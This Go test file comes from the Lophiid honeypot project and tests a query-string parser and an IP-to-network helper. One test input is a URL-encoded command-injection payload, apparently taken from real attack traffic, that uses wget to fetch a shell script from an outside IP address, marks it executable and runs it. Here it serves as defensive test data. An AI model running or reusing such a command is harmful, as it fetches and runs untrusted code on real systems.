// Lophiid distributed honeypot
// Copyright (C) 2024 Niels Heinen
//
// This program is free software; you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the
// Free Software Foundation; either version 2 of the License, or (at your
// option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
// or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
// for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
//
package util

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestCustomParseQuery(t *testing.T) {

	res, err := CustomParseQuery("path=%22;cd%20%2Fvar%3Bwget%20http%3A%2F%2F45.128.232.229%2Fcgi-dns.sh%3Bchmod%20%2Bx%20cgi-dns.sh%3Bsh%20cgi-dns.sh%22")

	if err != nil {
		t.Errorf("got unexpected error %v", err)
	}

	if len(res) != 1 {
		t.Errorf("expected 1 result, got %d", len(res))
	}
}

func TestGet24Network(t *testing.T) {
	for _, tc := range []struct {
		name        string
		ipAddr      string
		expected    string
		expectError bool
	}{
		{"valid IPv4 returns /24 network", "192.168.1.100", "192.168.1.0/24", false},
		{"IPv4 at network boundary", "10.20.30.0", "10.20.30.0/24", false},
		{"IPv4 with max host bits", "172.16.5.255", "172.16.5.0/24", false},
		{"different /24 network", "8.8.8.8", "8.8.8.0/24", false},
		{"IPv6 returns /64 network", "2001:db8:85a3::8a2e:370:7334", "2001:db8:85a3::/64", false},
		{"IPv6 at network boundary", "2001:db8:1234:5678::", "2001:db8:1234:5678::/64", false},
		{"IPv6 with host bits", "fe80::1", "fe80::/64", false},
		{"invalid IP returns error", "not-an-ip", "", true},
		{"empty string returns error", "", "", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			result, err := Get24NetworkString(tc.ipAddr)

			if tc.expectError {
				require.Error(t, err)
				assert.Empty(t, result)
			} else {
				require.NoError(t, err)
				assert.Equal(t, tc.expected, result)
			}
		})
	}
}
